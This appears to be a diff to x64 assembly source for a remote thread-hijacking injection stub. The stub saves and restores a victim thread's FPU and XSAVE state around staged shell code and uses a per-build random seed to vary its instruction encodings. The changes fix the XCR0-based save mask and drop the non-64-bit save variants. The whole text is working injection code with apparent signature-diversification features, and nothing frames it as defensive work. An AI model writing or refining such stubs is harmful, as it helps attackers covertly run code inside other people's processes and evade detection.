@@ -23,8 +23,11 @@ STUB_SEED EQU AMEGER_STUB_SEED
 ELSE
 .ERR <AMEGER_STUB_SEED must be provided by the build (randomized per build)>
 ENDIF
+;; STUB_SEED only steers encoding choices. It must never select between semantically
+;; different instructions: STUB_FP_ADDR picks between two equivalent ways of forming
+;; the FP area address, and STUB_RSP_CAPTURE picks between two equivalent ways of
+;; reading RSP. Both are pure diversification.
 STUB_FP_ADDR     EQU (STUB_SEED AND 1)
-STUB_FP_WIDTH    EQU (STUB_SEED AND 2)
 STUB_RSP_CAPTURE EQU (STUB_SEED AND 4)
 
 RemoteThreadHijackBegin:
@@ -64,20 +67,24 @@ ELSE
 ENDIF
     cmp dword ptr [rbx+SR_FP_FLAGS], SR_FP_FLAG_XSAVE
     jne StubFpSaveFallback
-    mov eax, [rbx+SR_FP_MASK]
+    ;; XGETBV reads the XCR0 of whichever thread executes this stub, so the mask is
+    ;; derived from the victim's own XCR0 and never from the injector's. The value the
+    ;; injector staged in SR_FP_MASK is the CPU capability ceiling; the intersection
+    ;; of the two is what is legal to request (anything else raises #GP).
+    xor ecx, ecx
+    xgetbv
+    and eax, SR_FP_XCR0_MASK
+    and eax, dword ptr [rbx+SR_FP_MASK]
+    mov dword ptr [rbx+SR_FP_MASK], eax
     xor edx, edx
-IF STUB_FP_WIDTH
+    ;; xsave64 (REX.W) is the only form that captures the full 256-bit XMM/YMM state.
     xsave64 [r10]
-ELSE
-    xsave [r10]
-ENDIF
     jmp StubFpSaveDone
 StubFpSaveFallback:
-IF STUB_FP_WIDTH
+    ;; No XSAVE on this CPU: FXSAVE64 still captures the full XMM registers. The YMM
+    ;; upper halves cannot be captured by FXSAVE at all, but the stub never writes them
+    ;; either, so they pass through untouched.
     fxsave64 [r10]
-ELSE
-    fxsave [r10]
-ENDIF
 StubFpSaveDone:
 
     fldcw word ptr [rbx+SR_SHELL_CW]
@@ -126,21 +133,16 @@ ELSE
 ENDIF
     cmp dword ptr [rbx+SR_FP_FLAGS], SR_FP_FLAG_XSAVE
     jne StubFpRestoreFallback
-    mov eax, [rbx+SR_FP_MASK]
+    ;; Reuse the mask the save phase actually used (it was narrowed against the
+    ;; victim's XCR0 there); restoring with a different mask would fault or leave the
+    ;; saved components unrestored.
+    mov eax, dword ptr [rbx+SR_FP_MASK]
     xor edx, edx
-IF STUB_FP_WIDTH
     xrstor64 [r10]
-ELSE
-    xrstor [r10]
-ENDIF
     jmp StubFpRestoreDone
 StubFpRestoreFallback:
-IF STUB_FP_WIDTH
     fxrstor64 [r10]
-ELSE
-    fxrstor [r10]
-ENDIF
-    StubFpRestoreDone:
+StubFpRestoreDone:
 
 
 
